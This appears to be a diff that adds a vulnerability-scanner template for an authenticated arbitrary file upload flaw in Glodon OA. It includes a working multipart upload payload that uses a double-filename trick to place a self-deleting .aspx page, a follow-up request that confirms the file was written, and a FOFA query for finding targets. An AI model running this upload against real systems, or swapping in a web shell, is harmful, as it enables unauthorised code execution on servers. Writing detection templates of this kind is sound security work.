@@ -1,0 +1,49 @@
+id: glodon-oa-msgbroadcastuploadfile-uploadfile
+
+info:
+  name: 广联达oa 后台文件上传漏洞 (需登录)
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    广联达oa 存在任意文件上传漏洞。需要先利用 广联达 OA SQL注入漏洞获取 admin 密码，然后登录后通过 /gtp/im/services/group/msgbroadcastuploadfile.aspx 文件上传接口上传任意文件。
+    FOFA: body="/Services/Identification/"
+  tags: glodon,uploadfile
+  created: 2023/09/02
+
+set:
+  rboundary: randomLowercase(8)
+  randBody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /gtp/im/services/group/msgbroadcastuploadfile.aspx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\"\r\n\
+        Content-Type: image/text\r\n\
+        \r\n\
+        <%@ Page Language=\"C#\" %>\r\n\
+        <%\r\n\
+            Response.Write(\"{{randBody}}\");\r\n\
+            System.IO.File.Delete(Server.MapPath(Request.FilePath));\r\n\
+        %>\r\n\
+        \r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'附件上传成功')
+    output: 
+      search: |
+        "result:'(?P<filename>.*?)'".bsubmatch(response.body)
+      filename: search["filename"]
+  r1:
+    request:
+      method: GET
+      path: /GTP/IM/Services/Group/Upload/{{filename}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randBody))
+expression: r0() && r1()
+
+# 文件访问地址： http://ip/GTP/IM/Services/Group/Upload/xx
